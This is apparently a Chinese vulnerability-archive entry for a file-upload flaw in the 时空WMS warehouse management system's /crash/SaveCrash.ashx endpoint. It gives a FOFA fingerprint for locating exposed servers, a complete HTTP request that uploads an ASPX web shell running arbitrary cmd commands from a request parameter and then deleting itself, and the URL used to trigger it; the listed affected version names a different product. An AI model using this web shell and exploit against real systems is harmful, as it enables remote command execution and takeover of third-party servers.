---
version: "锁群管理系统 V2.0"
fofa: "body="
source: "wy876 漏洞文库"
---

# 时空WMS-仓储精细化管理系统SaveCrash存在文件上传漏洞

# 一、漏洞简介
时空WMS-仓储精细化 管理系统Q是一款高效、智能的仓储管理工具，旨在帮助企业实现仓库的精细化管理和高效运营。由郑州时空软件开发，专注于以数字化、智能化推动企业进步。该系统基于先进的仓储管理理念和技术架构，融合了物联网、移动互联等前沿技术，实现了对仓库内物资的全面、精准、高效管理。系统适用于各类仓储物流企业，包括电商仓储、第三方物流、生产仓储等多个领域。通过使用该系统，企业可以实现对仓库内物资的全面掌控和高效管理，提高库存周转率，降低库存成本，提升企业竞争优势。时空WMS-仓储精细化管理系统SaveCrash存在文件上传漏洞 

# 二、影响版本
```plain
锁群管理系统 V2.0
```

# <font style="color:rgb(51, 51, 51);">三、资产测绘</font>
+ fofa`body="SKControlkLForJson.ashx"`
+ 特征


# 四、漏洞复现
```plain
POST /crash/SaveCrash.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip

------WebKitFormBoundaryssh7UfnPpGU7BXfK
Content-Disposition: form-data; name="file"; filename="rce.aspx"
Content-Type: text/plain

<%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());System.IO.File.Delete(Request.PhysicalPath);Response.End();%>
------WebKitFormBoundaryssh7UfnPpGU7BXfK--
```


```plain
/crash/log/2024_12/133775453729140443.aspx?cmd=whoami
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zbiltpbxr1s31uex>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
